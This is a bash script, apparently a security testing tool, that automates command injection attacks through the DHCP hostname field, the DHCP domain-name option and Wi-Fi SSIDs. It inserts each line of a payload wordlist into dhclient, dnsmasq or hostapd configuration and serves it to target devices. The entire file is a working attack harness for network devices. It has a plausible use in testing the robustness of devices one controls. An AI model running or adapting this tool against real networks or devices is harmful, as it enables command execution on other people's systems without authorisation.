#!/bin/bash
# DHCP Hostname / Domain-name / SSID Command Injection
# Author: Erebus
# Version: v2.0
# Last update: 2021/03/25
# Tested on Kali Linux 2019 & 2020
### Changelog ###
# - Adjust the program to be worked with AP.sh >= v2.1
# - Add support for SSID command injection
# - Add support for time delay before releasing the IP address
# - Automatically restore the value of the inserted field after attack
# - Escape ampersand(&) in sed replace command
# - Add value check for user input arguments

### Variables Initialization ###
declare -f -t trap_add
AP_PATH="./AP_v3.0.sh"
WORDLIST="./cmd.txt"
OPTION=
ASSIGNED=1
PERIOD=10
ORIGINAL_VALUE=""
AP_SUPPORT_ARGS=( "-b" "--bridge" "-i" "--interface" "-s" "--source" "-g" "--gateway" "-c" "--conf-dir" )

usage() {
    echo "DHCP Hostname / Domain-name / SSID Command Injection"
    echo "Usage: $0 (-H|-D|-S) (-b NIC1[,NIC2,...] | -i NIC1) [[-p WORDLIST] [OPTION...] | [-h]]"
    echo "  -h, --help              Display this help menu"
    echo "  -H, --host              Hostname Command Injection (Targeting DHCP server)"
    echo "  -D, --domain            Domain-name Command Injection (Targeting DHCP client)"
    echo "  -S, --SSID              SSID Command Injection (Targeting AP client)"
    echo "  -p, --payload WORDLIST  The file with commands you want to inject (default: $WORDLIST)"
    echo "  -n, --number ASSIGNED   How many hosts you want to assign IP to at a time"
    echo "                          (default: $ASSIGNED, only used along with -D or -S assigned)"
    echo "  -d, --delay PERIOD      The time (in seconds) to wait before releasing the IP address after each attack"
    echo "                          (default: $PERIOD sec)"
    echo "  (All options supported in AP.sh could also be assigned)"
    echo "Prerequisites:"
    echo "  Programs: iptables, dnsmasq, stdbuf, hostapd"
    echo "  AP.sh version >= v3.0"
    echo "  AP.sh must be placed in the same folder"
}

trap_add() {
    trap_add_cmd=$1; shift
    for trap_add_name in "$@"; do
        trap -- "$(
            # Get existing trap command from output of trap -p
            extract_trap_cmd() { printf '%s\n' "$3"; }
            # Print existing trap command with newline
            eval "extract_trap_cmd $(trap -p "${trap_add_name}")"
            # Print the new trap command
            printf '%s\n' "${trap_add_cmd}"
        )" "${trap_add_name}" \
            || fatal "unable to add to trap ${trap_add_name}"
    done
}

countdown() {
    secs=$1
    shift
    msg=$@
    while [ $secs -gt 0 ]
    do
      printf "\r\033[KWaiting %.d seconds $msg" $((secs--))
      sleep 1
    done
    printf "\r\033[K"
}

cleanup_add() {
    # Restore the value of the argument after attack
    if [[ ! -z "$ORIGINAL_VALUE" ]];then
        if [[ $OPTION = "host" ]]; then
            echo
            privileged_exec sed -i "s~^send host-name.*~send host-name = $ORIGINAL_VALUE~g" /etc/dhcp/dhclient.conf
        elif [[ $OPTION = "domain" ]]; then
            privileged_exec sed -i "s~^domain.*~domain=$ORIGINAL_VALUE~g" $CONF_DIR/dnsmasq.conf
        elif [[ $OPTION = "SSID" ]]; then
            privileged_exec sed -i "s~^ssid.*~ssid=$ORIGINAL_VALUE~g" $CONF_DIR/hostapd.conf
        fi
    fi
    exit
}

exploitation() {
    echo =========================================================================
    printf "Trying \033[1m\033[91m$line\033[0m\n"
    service_enable >/dev/null
    echo "Press p to pause, n to skip this one"

    # Check if DHCP server offered an IP / IPs
    while ! [[ $(wc -l < $CONF_DIR/dnsmasq.leases) -ge $ASSIGNED ]]; do
        echo -n .
        read -t1 -r -s -n1 KEY < /dev/tty
        # NO key was pressed
        if [[ -z "$KEY" ]];then
            continue
        elif [[ "$KEY" == 'p' ]]; then
            echo Paused.
            service_stop
            echo Press any key to continue...
            read -r -s -n1 < /dev/tty
            echo Continue...
            service_enable >/dev/null
        elif [[ "$KEY" == 'n' ]]; then
            echo Skipping
            break
        fi
    done
}

post_exploitation() {
    if [[ -s $CONF_DIR/dnsmasq.leases ]]; then
        echo
        echo "--------------------------------------------------"
        echo Show IP lease information
        cat $CONF_DIR/dnsmasq.leases
        echo "--------------------------------------------------"
        # Wait for assigned period before continuing
        countdown $PERIOD "before terminating DHCP/AP service"
        echo "Please release the target's IP or restart it if the IP cannot be released manually..."
    fi

    if [[ "$line" == "$lastline" ]]; then
        echo DONE
        cleanup >/dev/null
        cleanup_add
        exit 0
    fi

    service_stop
    read -p "Press [Enter] to continue" < /dev/tty
    echo
}

hostname_cmd_injection() {
    # Read each line in the payload file
    # IFS='' (or IFS=):     prevents leading/trailing whitespace from being trimmed.
    # -r:                   prevents backslash escapes from being interpreted.
    # || [[ -n $line ]]:    prevents the last line from being ignored
    #                       if it doesn't end with a \n (since read returns a non-zero exit code when it encounters EOF).
    ORIGINAL_VALUE=$(sed -n 's/^send host-name = *//p' /etc/dhcp/dhclient.conf)
    lastline=$(cat $WORDLIST | tail -n1)
    while IFS='' read -r line || [[ -n "$line" ]]; do
        # Release the IP address
        privileged_exec dhclient -r $TARGET_NIC
        # Change the MAC address everytime before requesting new IP
        # privileged_exec macchanger -r $NIC > /dev/null 2>&1
        echo =========================================================================
        # Start inserting payload into the host-name
        printf "Trying \033[1m\033[91m$line\033[0m\n"
        privileged_exec sed -i "s~^send host-name.*~send host-name = \"${line//&/\\&}\";~g" /etc/dhcp/dhclient.conf
        # Request for IP address
        privileged_exec dhclient $TARGET_NIC

        if [[ "$line" == "$lastline" ]]; then
            privileged_exec dhclient -r $TARGET_NIC
            echo DONE
            cleanup_add
            exit 0
        fi
        # Wait for assigned period before continuing
        countdown $PERIOD "before releasing IP address"
    done < "$WORDLIST"
}

domainname_cmd_injection() {
    initialization >/dev/null
    ORIGINAL_VALUE=$(sed -n 's/^domain=*//p' $CONF_DIR/dnsmasq.conf)
    lastline=$(cat $WORDLIST | tail -n1)
    while IFS='' read -r line || [[ -n $line ]]; do
        privileged_exec sed -i "s~^domain.*~domain=${line//&/\\&}~g" $CONF_DIR/dnsmasq.conf
        exploitation
        post_exploitation
    done < "$WORDLIST"
}

SSID_cmd_injection() {
    initialization >/dev/null
    ORIGINAL_VALUE=$(sed -n 's/^ssid=*//p' $CONF_DIR/hostapd.conf)
    lastline=$(cat $WORDLIST | tail -n1)
    while IFS='' read -r line || [[ -n $line ]]; do
        privileged_exec sed -i "s~^ssid.*~ssid=${line//&/\\&}~g" $CONF_DIR/hostapd.conf
        exploitation
        post_exploitation
    done < "$WORDLIST"
}

# At least one argument is needed (-H|-D|-S)
if [[ $# -lt 1 ]]; then
    usage
    exit 1
fi

. $AP_PATH

while [ "$1" != "" ]; do
    case $1 in
        # -H, -D and -S cannot be assigned all in once
        -H | --host )           if [[ "$OPTION" != "" ]]; then
                                    usage
                                    exit 1
                                else
                                    OPTION="host"
                                fi
                                ;;
        -D | --domain )         if [[ "$OPTION" != "" ]]; then
                                    usage
                                    exit 1
                                else
                                    OPTION="domain"
                                fi
                                ;;
        -S | --SSID )           if [[ "$OPTION" != "" ]]; then
                                    usage
                                    exit 1
                                else
                                    OPTION="SSID"
                                fi
                                ;;
        -p | --payload )        shift
                                if [[ ! -f $1 ]]; then
                                    echo "[ERROR] File \"$1\" not found! Create one or assign the WORDLIST with [-p | --payload WORDLIST]"
                                    exit 1
                                fi
                                WORDLIST=$1
                                ;;
        -n | --number )         shift
                                re='^[0-9]+$'
                                [[ $1 =~ $re ]] && ASSIGNED=$1 || { echo "[ERROR] Please assign a interger to specify the number of DUT (e.g. -n 2)"; exit 1; }
                                ;;
        -d | --delay )          shift
                                re='^[0-9]+$'
                                [[ $1 =~ $re ]] && PERIOD=$1 || { echo "[ERROR] Please assign a interger to specify the delay time (in seconds) (e.g. -d 30)"; exit 1; }
                                ;;
        -h | --help )           usage
                                exit
                                ;;
        # Pass the argument if it is supported in AP.sh
        * )                     if [[ " ${AP_SUPPORT_ARGS[@]} " =~ " ${1} " ]]; then
                                    arg=$1
                                    shift
                                    echo "$arg" "$1"
                                    argument_parse "$arg" "$1"
                                else
                                    usage
                                    exit 1
                                fi
    esac
    shift
done

requirement_check

if [[ $OPTION = "host" ]]; then
    trap cleanup_add SIGINT
    printf "\033[1mHostname Command Injection\033[0m\n"
    hostname_cmd_injection
elif [[ $OPTION = "domain" ]]; then
    trap cleanup SIGINT
    printf "\033[1mDomain-name Command Injection\033[0m\n"
    trap_add cleanup_add SIGINT
    domainname_cmd_injection
elif [[ $OPTION = "SSID" ]]; then
    is_wireless_interface $TARGET_NIC || { echo "[ERROR] $TARGET_NIC is not a wireless network interface"; exit 1; }
    printf "\033[1mSSID Command Injection\033[0m\n"
    trap cleanup SIGINT
    trap_add cleanup_add SIGINT
    SSID_cmd_injection
else
    usage
    exit 1
fi
